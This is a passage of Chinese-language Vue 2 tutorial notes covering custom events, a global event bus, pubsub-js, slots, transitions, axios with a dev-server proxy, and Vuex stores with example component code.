    </div>
  </template>
  
  <script>
  import School from './components/School.vue'
  import Student from './components/Student.vue'
  export default {
    name: 'App',
    components:{Student, School},
    data() {
      return {
        msg: 'hello !'
      }
    },
    methods: {
      getSchoolName(name){
        console.log('外部收到了schoolname',name);
      },
      show(str){
        console.log('自定义事件触发了',str);
      }
    } ,
    mounted() {
      this.$refs.student.$on('newEvent',this.show)
    },
  }
  </script>
  
  <style>
  .outer{
    background:rgb(125, 125, 190);
    padding: 20px;
  }
  </style>
  ~~~

* 同样的它可以支持事件后缀符，也可以在事件注册时候使用事件注册的API，比如$once()绑定触发一次的事件

## 自定义事件解绑

原则就是：

* 给谁绑定的自定义事件找谁触发
* 给谁绑定的自定义事件找谁解绑
* 使用this.$off('事件名')方法解绑

~~~vue
<template>
  <div class="demo">
      <h2>学生名称：{{name}}</h2>
      <h2>学生性别：{{gender}}</h2>
      <button @click="sendName">点击触发自己的自定义事件</button>
      <button @click="unBind">解绑自定义事件</button>
  </div>
</template>

<script>
export default {
    name:'School',
    data() {
        return {
            name: 'shishi',
            gender: '男'
        }
    },
    methods: {
        sendName(){
            this.$emit('newEvent',this.name)
        },
         unBind(){
        this.$off('newEvent')
        }
    },
   
}
</script>

<style scoped>
.demo{
    background: #bfa;
    padding: 20px;
}
</style>
~~~

* 如果要解绑多个事件,将参数写成数组形式
* `this.$off(['e1','e2'])`
* 另一种暴力的解绑方法，$off()不写参数，所有自定义事件全部解绑
* 这个自定义事件就是生命周期destroyed()函数执行前会被移除的事件

* 组件上也可以绑定原生DOM事件，需要使用  `.native`修饰符

## 全局事件总线

可以实现任意组件间通信

* 并不是一个新的API，是将之前的所学整合在一起实现的一种开发模式
* 它让一个新的东西来整合所有的事件，然后让其他组件在这个东西里触发对应的事件来实现任意组件通信
* 这个新的东西不属于任意一个组件，完全从组件中脱离出来，相当于一个注册中心
* 那这个注册中心应该具备这些条件
  * 所有组件都能看到它
  * 这个东西必须保证能调用 $on()和$off()方法以及$emit()（不然怎么去绑定事件和解绑及触发）

那么为了实现让所有组件都能看到，根据这个关系`VueComponent.prototype.__proto__ === Vue.prototype`（它能让组件实例vc访问到Vue原型上的东西）

当然得在Vue引入后添加，在main.js文件中

~~~js
import Vue from 'vue'
import App from './App.vue'

Vue.config.productionTip = false

//往Vue原型上放东西
Vue.prototype.obj = {a:1,b:2}

new Vue({
  render: h => h(App)
}).$mount('#app')
~~~

* 那么之后，你的每一个组件都可以通过**this.obj**访问到这些数据

但是此时第二个条件是不满足的，因为访问不到 **$on()和$off()方法以及$emit()**

* obj里并没有这些方法，它的原型是Object的原型，自然也没有
* 那么我们可以分析到哪里有这些方法，在组件实例对象上有，而且是因为这些方法都在Vue的原型对象上，可以`console.log(Vue.prototype)`查看

* 所以如果我们将obj写为一个对象，它就顺着原型链是找不到Vue的原型上去的

  * 那么第一种方法：new 一个组件实例vc出来，让它来当这个注册中心，完全能实现功能

  * ~~~js
    //vc
    const newVc = Vue.extend({})
    const busCenter = new newVc()
    
    Vue.prototype.bus = busCenter
    ~~~

  * 所有的组件都能访问到bus数据，并且有**$on()和$off()方法以及$emit()**

  * 自然第二种方法：就是vm，但是不能这样写

  * ~~~js
    const vm = new Vue({
      render: h => h(App)
    }).$mount('#app')
    
    Vue.prototype.bus = vm
    ~~~

  * 因为这样表示vue的工作都做完了，app模板都渲染完了你才添加上，已经晚了

  * 所以我们应该写在钩子里，beforeCreate()周期函数，这个钩子里this就是vm，而且其他的数据代理以及一些准备工作还没开始，完全符合我们的需求

  * ~~~js
    new Vue({
      render: h => h(App),
      beforeCreate() {
        Vue.prototype.bus = this
      },
    }).$mount('#app')
    ~~~

所以最标准的写法就是这样，而且一般写为这样**$bus**

~~~js
new Vue({
  render: h => h(App),
  beforeCreate() {
    Vue.prototype.$bus = this//安装全局事件总线
  },
}).$mount('#app')
~~~

那么例子：实现school，student两个兄弟组件的消息通信

school组件注册事件

~~~vue
<script>
export default {
    name:'School',
    data() {
        return {
            name: 'cup',
            address: 'beijing cp'
        }
    },
    mounted() {
        this.$bus.$on('hello',(data)=>{
            console.log('我收到了其他组件传来的数据',data);
        })
    },
}
</script>
~~~

student组件触发事件

~~~vue
<script>
export default {
    name:'School',
    data() {
        return {
            name: 'shishi',
            gender: '男'
        }
    },
    mounted() {
        this.$bus.$emit('hello',this.name)
    },
   
}
</script>
~~~

可以看到控制输出

~~~bash
我收到了其他组件传来的数据 shishi
~~~

* 注意：

  * 如果怕命名冲突，我们应该新建一个配置文件来保存我们的事件名称常量

  * 我们应该给绑定了事件的组件在组件销魂时候解绑，因为组件没了但这个中间傀儡还在

  * 而且使用off（）方法一定要给参数，不然全部事件都被解绑了，其他组件注册的事件都不能用了

  * ~~~vue
    <script>
    export default {
        name:'School',
        data() {
            return {
                name: 'cup',
                address: 'beijing cp'
            }
        },
        mounted() {
            this.$bus.$on('hello',(data)=>{
                console.log('我收到了其他组件传来的数据',data);
            })
        },
        beforeDestroy() {
            this.$bus.$off('hello')
        },
    }
    </script>
    ~~~

## 消息订阅与发布

* 适用于任意组件间通信
* 模型与全局事件总线一样，在vue中建议使用总线模型

* 类似报纸的发布和订阅
  * 订阅消息： 消息名
  * 发布消息： 消息内容

原生js实现比较困难，所以我们使用第三方库，建议使用pubsub-js  库

### pubsub-js  

- publish subscribe
- 一个比较简单的，能在任何框架中使用的库
- 安装：npm i pubsub-js

使用，在订阅消息和发布消息的组件里都要引入这个库

~~~js
import pubsub from 'pubsub-js'
~~~

订阅方：

~~~vue
<script>
import pubsub from 'pubsub-js'
export default {
    name:'School',
    data() {
        return {
            name: 'cup',
            address: 'beijing cp'
        }
    },
    mounted() {
        pubsub.subscribe('getStName',function (msgName,value) { 
            console.log('有人发布消息，回调函数执行',value);
         })
    },
}
</script>
~~~

发布方：

~~~vue
<script>
import pubsub from 'pubsub-js'
export default {
    name:'School',
    data() {
        return {
            name: 'shishi',
            gender: '男'
        }
    },
    methods: {
        sendName(){
            pubsub.publish('getStName',this.name)
        }
    },
}
</script>
~~~

* 回调函数 接收的第一个参数是消息的名字，从第二个参数开始才是传递的参数（即消息内容）

* 它的关闭类似定时器

  * ~~~js
     mounted() {
            this.pubId = pubsub.subscribe('getStName',function (msgName,value) { 
                console.log('有人发布消息，回调函数执行',value);
             })
        },
        beforeDestroy() {
            pubsub.unsubscribe(this.pubId)
        },
    ~~~

* 如果配合vue使用的话，pubsub里的函数的this是undefined，所以建议将回调函数写成箭头函数形式将this指向vueComponent实例

## $nextTick

* vc上，可以找到 `this.$nextTick(function(){})`它指定的回调函数会在下一次DOM节点更新后再执行

* 它可以保证有些必须在真实DOM渲染在页面后才能正常运行的代码的成功执行，比如新加输入框的焦点获取

  ~~~js
  this.refs.xxx.focus()
  ~~~

## 插槽

### 默认插槽

* 一个用来占位的部件
* 首先摆上例子
* 一个分类组件

~~~vue
<template>
  <div class="sort">
      <h2>xxx分类</h2>
      <ul>
          <li v-for="(item, index) in listData" :key="index">{{ item }}</li>
      </ul>
  </div>
</template>

<script>
export default {
    name:'Sort',
    props: ['listData','title']
}
</script>

<style>
.sort{
    background: #bfa;
    width: 200px;
    height: 300px;
}
h2{
    text-align: center;
    background:pink;
}
</style>
~~~

* App里复用多个此组件

* ~~~vue
  <template>
    <div class="container">
      <Sort name="食物" :listData='foods' />
      <Sort name="游戏" :listData='games' />
      <Sort name="电影" :listData='movies' />
    </div>
  </template>
  
  <script>
  import Sort from './components/Sort.vue'
  export default {
    name: 'App',
    components:{Sort},
    data() {
      return {
        foods:['茄子','西红柿','白菜','土豆'],
        games:['csgo','lol','pubg'],
        movies:['绿皮书','肖声克的救赎','悲惨世界','伍佰']
      }
    },
    
  }
  </script>
  
  <style>
  .container{
    display: flex;
    justify-content: space-around;
  }
  </style>
  ~~~

* 页面将会显示三个不同的分类卡片

* 现在要实现有些分类展示一些小广告，但不是全部卡片都显示

  * 首先我们将组件自闭和标签改为双标签

  * 然后在里面 放元素占位

  * ~~~vue
    <template>
      <div class="container">
        
        <Sort name="食物" :listData='foods'>
          <div>这里表示一个食物相关广告</div>
        </Sort>
        
        <Sort name="游戏" :listData='games' >
          <!-- 这个分类不放广告 -->
        </Sort>
        
        <Sort name="电影" :listData='movies' >
          <span>这里表示一个食物相关广告</span>
        </Sort>
        
      </div>
    </template>
    ~~~

  * 然后在组件里要使用slot标签来接收外面指定好了的结构并替换掉slot元素

  * ~~~vue
    <template>
      <div class="sort">
          <h2>xxx分类</h2>
        
          <slot>我是一个占位符，当使用者没有传递具体结构时候，我会出现，否则将我替换成传递的结构</slot>
     
        <ul>
              <li v-for="(item, index) in listData" :key="index">{{ item }}</li>
          </ul>
      </div>
    </template>
    ~~~

  * 当我们不写`我是一个占位符，当使用者没有传递具体结构时候，我会出现，否则将我替换成传递的结构`时候，页面就不显示东西了（没传结构时候），这就实现了一个灵活的应用

  * 也就是外面的slot会替换里面的slot，实现占位需求

### 具名插槽

* 具有名字的插槽，上面的默认插槽是没有名字

* 如果有很多个插槽，就要使用具名插槽来区分了

* 但是注意

  * 如果在外面这样写

  * ~~~vue
    <Sort name="食物" :listData='foods'>
          <div>这里表示一个食物相关广告</div>
          <a href="baidu.com">这是一个连接</a>
    </Sort>
    ~~~

  * 然后里面还是写slot

  * ~~~vue
    <slot>1</slot>
    <slot>2</slot>
    ~~~

  * 这两个元素都会被放到同一个 slot中，也就是在这里，所有东西都会被展示双份

  * 所以我们应该给slot 加一个name属性来标识这两个插槽

  * ~~~vue
    <slot name="describe"></slot>
    <slot name="link"></slot>
    ~~~

  * 同样的在外面需要指定往哪个插槽里放

  * ~~~vue
     <Sort name="食物" :listData='foods'>
          <div slot="describe">这里表示一个食物相关广告</div>
          <a slot="link" href="baidu.com">这是一个连接</a>
    </Sort>
    ~~~

  * 而且我们可以往插槽里**追加**元素

  * ~~~vue
    <Sort name="食物" :listData='foods'>
          <div slot="describe">这里表示一个食物相关广告</div>
          <a slot="link" href="baidu.com">这是一个连接</a>
          <a slot="link" href="baidu.com">这是一个连接222</a>
          <a slot="link" href="baidu.com">这是一个连接333</a>
    </Sort>
    ~~~

  * 如果使用了**template**标签，vue2.6新提出来的一个指定插槽的写法

  * ~~~vue
     <Sort name="食物" :listData='foods'>
          <div slot="describe">这里表示一个食物相关广告</div>
       
          <template v-slot:link>
              <a href="baidu.com">这是一个连接</a>
              <a href="baidu.com">这是一个连接222</a>
              <a href="baidu.com">这是一个连接333</a>
          </template>
       
    </Sort>
    ~~~

### 作用域插槽

* 假如我们的数据是固定的，但是每一个分类根据数据生成的结构是使用者定的

* 数据固定

* ~~~vue
  <template>
    <div class="sort">
        <h2>{{title}}分类</h2>
        <ul>
            <li v-for="(item, index) in games" :key="index">{{ item }}</li>
        </ul>
    </div>
  </template>
  
  <script>
  export default {
      name:'Sort',
      props: ['title'],
      data() {
          return {
               games:['csgo','lol','pubg'],
          }
      },
  }
  </script>
  ~~~

* 但是我们不能将结构写在里面，让结构被slot占位

* ~~~vue
  <template>
    <div class="sort">
        <h2>{{title}}分类</h2>
      
        <slot></slot>
      
    </div>
  </template>
  
  <script>
  export default {
      name:'Sort',
      props: ['title'],
      data() {
          return {
               games:['csgo','lol','pubg'],
          }
      },
  }
  </script>
  ~~~

* 然后在外面放上结构

  * 但是注意，外面是拿不到里面的数据的，所以这是一个作用域问题

  * 所以我们要传数据

  * ~~~vue
    <slot :games="games" ></slot>
    ~~~

  * 它会将数据传给插槽的使用者

  * 然后外面必须使用template来包裹要指定的结构

  * ~~~vue
     <Sort title="游戏">
         <template scope="obj">
           {{ obj }}
            <ul>
              <li v-for="(item, index) in obj.games" :key="index">{{ item }}</li>
            </ul>
         </template>
    </Sort>
    ~~~

  * 并且使用scope来接收插槽传递过来的数据，是一个对象，里面有一个数据就是传递过来的数据

  * 而且支持解构赋值

  * ~~~vue
    <Sort title="游戏">
         <template scope="{games}">
            <ul>
              <li v-for="(item, index) in games" :key="index">{{ item }}</li>
            </ul>
         </template>
        </Sort>
    ~~~

  * 完整例子

  * ~~~vue
    <template>
      <div class="container">
    
        <Sort title="游戏">
         <template scope="obj">
           {{ obj }}
            <ul>
              <li v-for="(item, index) in obj.games" :key="index">{{ item }}</li>
            </ul>
         </template>
        </Sort>
    
        <Sort title="游戏">
         <template scope="obj">
            <ol>
              <li v-for="(item, index) in obj.games" :key="index">{{ item }}</li>
            </ol>
         </template>
        </Sort>
    
        <Sort title="游戏">
         <template scope="obj">
              <h3 v-for="(item, index) in obj.games" :key="index">{{ item }}</h3>
         </template>
        </Sort>
    
    
      </div>
    </template>
    ~~~

  * scope也可以写成 slot-scope（新API）

  * ~~~vue
    <Sort title="游戏">
         <template slot-scope="{games}">
            <ul>
              <li v-for="(item, index) in games" :key="index">{{ item }}</li>
            </ul>
         </template>
    </Sort>
    ~~~

## 过渡与动画

### 动画

* 我们需要定义好动画效果

* ~~~vue
  <style>
  .hello{
      background:#bfa;
  }
  .come{
      animation: show 1s;
  }
  .go{
      animation: show 1s reverse;
  }
  @keyframes show{
      from{
          transform: translateX(-200px);
      }
      to{
          transform: translateX(0);
      }
  }
  </style>
  ~~~

* 然后将需要动画效果的元素用 transition 标签包裹起来

* ~~~vue
  <template>
    <div>
        <button @click="isShow=!isShow">显示隐藏</button>
      
        <transition>
            <h2 class='hello' v-show="isShow">hello </h2>
        </transition>
        
    </div>
  </template>
  ~~~

* 但是vue是规定好了的样式的名字，

  * 比如上面的 come类必须写成 `.v-enter-active`,表示开始时候的动画

  * 然后离开时候触发的样式 `.v-leave-active`

  * 修改动画样式如下

  * ~~~vue
    <style>
    .hello{
        background:#bfa;
    }
    .v-enter-active{
        animation: show 1s;
    }
    .v-leave-active{
        animation: show 1s reverse;
    }
    @keyframes show{
        from{
            transform: translateX(-200px);
        }
        to{
            transform: translateX(0);
        }
    }
    </style>
    ~~~

    那么整个实例

    ~~~vue
    <template>
      <div>
          <button @click="isShow=!isShow">显示隐藏</button>
          <transition>
              <h2 class='hello' v-show="isShow">hello </h2>
          </transition>
          
      </div>
    </template>
    
    <script>
    export default {
        name: 'hello',
        data() {
            return {
                isShow: true
            }
        },
    }
    </script>
    
    <style>
    .hello{
        background:#bfa;
    }
    .v-enter-active{
        animation: show 1s;
    }
    .v-leave-active{
        animation: show 1s reverse;
    }
    @keyframes show{
        from{
            transform: translateX(-200px);
        }
        to{
            transform: translateX(0);
        }
    }
    </style>
    ~~~

    * 发现h2可以实现动画效果了
    * 这里你使用v-if还是v-show来实现显示隐藏都能触发动画
    * 我们可以给transition标签加name属性
      * 如果这样做，将 v-enter-active改为name-enter-active
    * 如果我们要实现页面刷新一上来就有这个效果，给transition标签加上   : appear=true
      * 注意加上：表示后面的值是一个布尔值而不是字符串
      * 可以简写为 appear

### 过渡

* 过渡就是将动画的进入拆成了两部分，进入的起点和进入的终点，同理动画的离开拆为了离开的起点和离开的重点

* ~~~vue
  <style scoped>
  .hello{
      background:#bfa;
      transition: 1s;
  }
  /* 进入的起点 */
  .v-enter{
      transform: translateX(-100%);
      background: blue;
  }
  /* 进入的终点 */
  .v-enter-to{
      transform: translateX(0);
      background: red;
  }
  /* 离开的起点 */
  .v-leave{
      transform: translateX(0);
      background: red;
  }
  /* 离开的终点 */
  .v-leave-to{
      transform: translateX(-100%);
      background: blue;
  }
  </style>
  ~~~

* 注意，要给过渡元素加上过渡时间` transition: 1s;`，不然看不出过渡效果

* 并且可以优化写法

  * 进入的起点就是离开的终点
  * 进入的终点就是离开的起点

  ~~~vue
  <style scoped>
  .hello{
      background:#bfa;
      transition: 1s;
  }
  /* 进入的起点 离开的终点*/
  .v-enter ,.v-leave-to{
      transform: translateX(-100%);
      background: blue;
  }
  /* 进入的终点 离开的起点*/
  .v-enter-to,.v-leave{
      transform: translateX(0);
      background: red;
  }
  </style>
  ~~~

  注意，transition标签里只能包裹一个元素，如果要包裹多个元素要使用transition-group，并且每一个子元素要个key值

  ~~~html
  <template>
    <div>
        <button @click="isShow=!isShow">显示隐藏</button>
        <transition-group appear>
            <h2 key="0" class='hello' v-if="isShow">hello </h2>
            <h2 key="1" class='hello' v-if="isShow">hello </h2>
            <h2 key="2" class='hello' v-if="isShow">hello </h2>
        </transition-group>
        
    </div>
  </template>
  ~~~

  * 当然可以选择用一个div将所有子元素包裹在一起再让它被transition包裹

    * 但是会破环html结构

    * 而且实现不了不同子元素实现相同动画的相反效果

      * ~~~vue
        <transition-group appear>
                  <h2 key="0" class='hello' v-if="isShow">hello </h2>
                  <h2 key="1" class='hello' v-if="!isShow">hello </h2>
        </transition-group>
        ~~~



### 集成第三方动画

​	一个比较好的库：animate.css

* 官网：https://animate.style/

* 安装： npm i animate.css

* 引入，注意它是一个css引入

* ~~~js
  import 'animate.css'
  ~~~

* 然后给translate加**name**属性，值为官网规定好的类名`animate__animated animate__bounce`

* ~~~vue
   <transition-group name="animate__animated animate__bounce" >
  ~~~

* 到此表示给这里配置好了使用这个库

* 然后指定使用哪个动画，直接去官网找和复制类名就行

* ~~~vue
  <transition-group 
       appear
       name="animate__animated animate__bounce" 
       enter-active-class="animate__tada"
       leave-active-class="animate__backOutDown">
            <h2 key="0" class='hello' v-if="isShow">hello </h2>
            <h2 key="1" class='hello' v-if="isShow">hello </h2>
  </transition-group>
  ~~~

  

  

# 第四章：关于脚手架中的ajax

比较常用的封装了ajax的库**axios**

* 它封装了xhr

* 它是jQuery封装的xhr的体积的1/4
* 并且使用promise风格

另一个 fetch 与 xhr 平级且是promise，可以拿到原生ajax方法，但是有两个问题

* 它的返回数据包裹两次promise
* 它的兼容性差，ie用不了

## axios

* 安装

* ~~~bash
  npm i axios
  ~~~

* 引入

* ~~~js
  import axios from 'axios'
  ~~~

* 使用

* ~~~vue
  <script>
  import axios from 'axios'
  export default {
    name: 'App',
    data() {
      return {
        msg: 'hello !'
      }
    },
    methods: {
      getData(){
        axios.get('http://localhost:8000/data').then(
          response => {
            console.log('请求成功:',response.data);
          },
          error => {
            console.log('请求失败',error.msg);
          }
        )
      }
    },
  }
  </script>
  ~~~

* 注意 返回的是promise对象，要 .then拿数据

* 至此，在使用脚手架开发时候测试的话，这里会产生跨域问题

## 解决跨域问题

* cors: 后端使用，它是真正意义上的解决跨域问题，后端会在响应头上加特殊数据，让浏览器放行
* jsonp：它巧妙的让script src绕过同源策略，同时需要前端和后端配合，不常用
* 配置代理服务器：它会转发前端的请求，去请求目的服务器拿到数据后再给前端，这个中介是服务器，它与后端服务器通信不受同源策略限制，它发的不是ajax请求

## 配置代理

* nginx： 做反向代理，后端常知

* 借助 vue-cli：

  * 需要在vue.config.js做配置

  * 官网说明：https://cli.vuejs.org/zh/config/#devserver-proxy

  * 第一种代理配置方式

  * ~~~js
    module.exports = {
        devServer: {
          proxy: 'http://localhost:8000'
        }
      }
    ~~~

  * 将目标服务器ip写上就行，这样这个中介服务器就开启了

  * 注意改了配置需要重启脚手架服务

  * 然后需要将发送请求的地方，将目标服务器的域名换成代理服务器的域名，但是后面的路径任然要写上

  * ~~~js
    //将 8000 改为 8080（脚手架的服务端口，也就是中介服务器的域名）
    axios.get('http://localhost:8000/data').then(
            response => {
              console.log('请求成功:',response.data);
            },
            error => {
              console.log('请求失败',error.msg);
            }
          )
    ~~~

  * 注意：

    * 这个代理服务器只会将本身找不到的资源请求转发给目标服务器，如果本身就有，不会转发，也就是没有跨域直接取
    * 而且这种代理配置方式虽然简单，但是不能配置多个代理，需要第二种代理配置方式

  * 第二种配置代理方式，官网说明两种配置方式都在一个页面中介绍了

  * ~~~js
    module.exports = {
        //方式一
        // devServer: {
        //   proxy: 'http://localhost:8000'
        // }
        //方式二
        devServer: {
            proxy: {
              '/api_1': {
                target: '<url>',
                 pathRewrite: {
                    '^/api_1': ''
                  },
                ws: true,
                changeOrigin: true
              },
            }
          }
      }
    ~~~

  * 'api_1' 是请求前缀，也就是以这个开头的请求会走代理，不加不走

    * 注意这个前缀指端口号后边的开头前缀
    * `http://localhost:8080/api_1/data`
    * 而且这个前缀是请求的url真实存在的，它会一起转发出去，路径变为了 api_1/data
    * 除非后端给的路径就是这样，否则要裁剪掉这个前缀，也就是重写路径

  * target： 目标服务器地址

  * pathRewrite: 值是一个对象，重写路径，这里使用正则表达式将api_1开头这几个字符去掉了

  * ws：用于支持websocket

  * changeOrigin：用于表示自己来自哪个域（控制请求头中的Host字段），true表示这个代理服务器告诉目标服务器同域名（撒谎），false表示告诉目标服务器我来自不同域名（实话），一般都要撒谎，防止服务器阻止不同域名的请求

  * 要配置多个代理就加上就行了

  * ~~~js
    module.exports = {
        //方式一
        // devServer: {
        //   proxy: 'http://localhost:8000'
        // }
        //方式二
        devServer: {
            proxy: {
              '/api_1': {
                target: '<url>',
                pathRewrite: {
                    '^/api_1': ''
                  },
                ws: true,
                changeOrigin: true
              },
    
              '/api_2': {
                target: '<url>',
                pathRewrite: {
                    '^/api_2': ''
                  },
                ws: true,
                changeOrigin: true
              },
            }
          }
      }
    ~~~

# 第五章：vuex

**概念**

* 专门在Vue中实现集中式状态（数据）管理的一个Vue**插件**，对vue应用中多个组件的**共享状态**进行集中式的管理（读/写），也是一种组件间通信的方式，且适用于任意组件间通信

**什么时候使用Vuex**  （共享）

* 多个组件依赖于同一状态
* 来自不同组件的行为需要变更同一状态

## Vuex的工作原理

* 原理图：https://vuex.vuejs.org/zh/
* Vuex三个重要组成部分
  * Actions：行为
  * Mutations：修改
  * State：状态（数据）
  * 以上三个部分需要 store 的管理来引导这三个部分,dispatch和commit方法都在store上
* 把数据交给Vuex管理就是交给Vuex里的State**对象**进行保管

* **VueComponent** 可以调用 API： **dispatch**来执行**actions**里的方法，**actions**会将数据修改提交**（commit函数）**给**Mutations**，**mutations**再去修改**state**里的状态
* **Dispatch('name',data)**接收两个参数
  * name：actions中对应的函数名，这个函数会拿到传递过来的参数
  * data：传递的参数
* **commit("name",data):**接收两个参数
  * name：mutations里的函数，这个函数会拿到两个东西
    * state
    * 传递过来的参数
  * data：传递的参数
* 只需要在mutations中直接state.数据修改就能引起state中数据的变化
* 然后**state**数据的改变会让对应组件重新渲染，页面也就更新了

**问题：为什么要多一步actions？**

* 看官网图示可知，后端接口应该在这里对接，我们可以在这里做一些与后端对接的异步操作
* vue实际上允许在组件里直接调用commit，跳过actions
* actions相当于餐厅的服务员，mutations相当于后厨
* actions中的代码可以供所有组件复用

## 搭建Vuex环境

* 安装 

  ~~~bash
  npm install vuex --save
  ~~~

* 然后去写自己的vuex

  * src下新建store文件夹

  * store文件夹下新建一个**index.js**文件，用于创建vuex中的核心store

    ~~~js
    //引入vuex
    import Vuex from 'vuex'
    
    //准备actions：用于相应组件中的动作
    const actions = {}
    
    //准备mutations：用于操作数据（state）
    const mutations = {}
    
    //准备state：用于存储数据
    const state = {}
    
    //创建store
    const store = new Vuex.Store({
        //写成对象简写形式
        actions,
        mutations,
        state
    })
    
    //向外暴露store
    export default  store
    ~~~

* 需要在main.js引入我们自己写的store，由于脚手架解析import语句的原因（它会不管import在哪一行，它都会将import优先执行，import提升了），再加上我们要保证Vue.use(Vuex)在import store前执行，应该将Vue.use(Vuex)放入到store文件中

* 所以index.js应该

  ~~~js
  //引入Vue
  import Vue from 'vue'
  //引入vuex
  import Vuex from 'vuex'
  
  //使用vuex
  Vue.use(Vuex)
  
  //准备actions：用于相应组件中的动作
  const actions = {}
  
  //准备mutations：用于操作数据（state）
  const mutations = {}
  
  //准备state：用于存储数据
  const state = {}
  
  //创建store，向外暴露store
  export default new Vuex.Store({
      //写成对象简写形式
      actions,
      mutations,
      state
  })
  ~~~

* 然后main.js中引入store文件，并在vm上添加即可

  ~~~js
  import Vue from 'vue'
  import App from './App.vue'
  
  Vue.config.productionTip = false
  
  //引入store
  import store from './store'
  
  new Vue({
    render: h => h(App),
    store,
  }).$mount('#app')
  ~~~

  

**实例**：

假如有一个求和组件，有一些求和要求，然后需要将和sum统一管理，也就是交给store管理

* 将共享值sum放到vuex中

  ~~~js
  //准备state：用于存储数据
  const state = {
      sum: 0
  }
  ~~~

* 然后组件中模板通过  **$store.state.sum** 读取到（不用加this，默认就是读取vc本身）

  ~~~vue
  <h2>当前和的值为： {{ $store.state.sum }} </h2>
  ~~~

* 整个组件是这样的

  ~~~vue
  <template>
    <div>
        <h2>当前和的值为： {{ this.$store.state.sum }} </h2>
        <input type="text" v-model.number="n">
        <br/><br/>
        <button @click="up"> + </button>
        <button @click="down"> - </button>
        <button @click="upWhenEven"> 为偶数再加 </button>
        <button @click="upAfter"> 延迟加 </button>
    </div>
  </template>
  
  <script>
  export default {
      name: 'demo',
      data() {
          return {
              n: 2
          }
      },
      methods: {
          up(){
  
          },
          down(){
  
          },
          upWhenEven(){
  
          },
          upAfter(){
  
          }
  
      },
  }
  </script>
  
  <style>
  button{
      margin-left: 20px;
  }
  </style>
  ~~~

* 然后编写我们的方法

* 使用  this.$store.dispatch('action', payload)来调用actions中的方法

  ~~~js
  up(){
     this.$store.dispatch('add', this.n)
  },
  ~~~

* 所以actions中应该有add这个方法

  * 它会接收两个参数
    * context：上下文，一个mini 的store，里面有commit这个重要的函数
      * 它也能拿到state，并且修改数也能成功，但是开发者工具检测不到这次动作！
      * 这样就没有将actions和mutations分开的意义了
    * data：传递过来的参数

  ~~~js
  //准备actions：用于相应组件中的动作
  const actions = {
      add(context,data){
          console.log('actions中的add被调用');
          console.log(context);
          console.log(data);
      }
  }
  ~~~

* 然后编写好这个方法来实现需求，使用context.commit('MUTATIONS', payload)向state提交数据

  ~~~js
  add(context,data){
          console.log('actions中的add被调用');
          context.commit('ADD', data)
  }
  ~~~

* 一般都将mutations中的方法名定义成全大写

* 然后编写mutations

  * ADD会接收两个参数
    * state：就是store的state对象，因为要修改它的数据
    * value，就是actions中传递过来的值

  ~~~js
  //准备mutations：用于操作数据（state）
  const mutations = {
      ADD(state,value){
          console.log('mutations中的ADD被调用')
          state.sum += value
      }
  }
  ~~~

* 然后再根据以上步骤完善我们的其他方法

* 其中对于偶数的判断和定时器，放在actions中完成，能够让我们的组件看起来工整且简洁

* 组件：

  ~~~vue
  <template>
    <div>
        <h2>当前和的值为： {{ this.$store.state.sum }} </h2>
        <input type="text" v-model.number="n">
        <br/><br/>
        <button @click="up"> + </button>
        <button @click="down"> - </button>
        <button @click="upWhenEven"> 为偶数再加 </button>
        <button @click="upAfter"> 延迟加 </button>
    </div>
  </template>
  
  <script>
  export default {
      name: 'demo',
      data() {
          return {
              n: 2
          }
      },
      methods: {
          up(){
              this.$store.dispatch('add', this.n)
          },
          down(){
              this.$store.dispatch('dec', this.n)
          },
          upWhenEven(){
              this.$store.dispatch('addWhenEven', this.n)
          },
          upAfter(){
              this.$store.dispatch('upAfter', this.n)
          }
  
      },
  }
  </script>
  
  <style>
  button{
      margin-left: 20px;
  }
  </style>
  ~~~

* store

  * 我们并不是需要一个actions中的方法就要对应一个mutations中的方法

  ~~~js
  //引入Vue
  import Vue from 'vue'
  //引入vuex
  import Vuex from 'vuex'
  
  //使用vuex
  Vue.use(Vuex)
  
  //准备actions：用于相应组件中的动作
  const actions = {
      add(context,data){
          context.commit('ADD', data)
      },
      dec(context,data){
          context.commit('DEC', data)
      },
      addWhenEven(context,data){
          if(data%2===0)context.commit('ADD', data)
      },
      upAfter(context,data){
          setTimeout(() => {
              context.commit('ADD', data)
          }, 2000);
      },
  }
  
  //准备mutations：用于操作数据（state）
  const mutations = {
      ADD(state,value){
          state.sum += value
      },
      DEC(state,value){
          state.sum -= value
      }
  }
  
  //准备state：用于存储数据
  const state = {
      sum: 0
  }
  
  //创建store，向外暴露store
  export default new Vuex.Store({
      //写成对象简写形式
      actions,
      mutations,
      state
  })
  ~~~

* 而且对于一些没有业务操作的数据可以绕过actions，组件中直接调用commit就可以了，但是注意方法名写的是mutstions中的方法

  ~~~js
  up(){
      this.$store.commit('ADD', this.n)
  },
  ~~~

## Vuex的开发者工具

* Vuex的开发者工具就是vue的开发者工具，因为都是vue团队打造的
* 点击工具的头部 计时器那个图标就是
* 它会记录mutations中的动作
* 可以查看每一次的动作，并且可以撤销某次动作（也会撤销掉依赖本次动作产生的数据的动作）
* 也可以合并几次动作，将合并的动作作为基础数据

## store中新的配置项getters

* 除了三个重要的 actions，mutations，state外,还有一个**非必要**的配置项gettres

* 它的存在类似于**计算属性**

* 写配置，并加在vuex上

  ~~~js
  //配置getters,用于将state中的数据加工
  const getters = {
      bigSum(state){
          return state.sum * 10
      }
  }
  
  //创建store，向外暴露store
  export default new Vuex.Store({
      //写成对象简写形式
      actions,
      mutations,
      state,
      getters
  })
  ~~~

  它会接收到一个参数，**state**

* 但是注意，并不是像计算属性那样，这个bigSum它不会放在state里，而是在getters里

* 所以我们应该这样取到数据`$store.getters.bigSum`

  ~~~vue
  <h2>当前和的放大值为： {{ $store.getters.bigSum }} </h2>
  ~~~

  
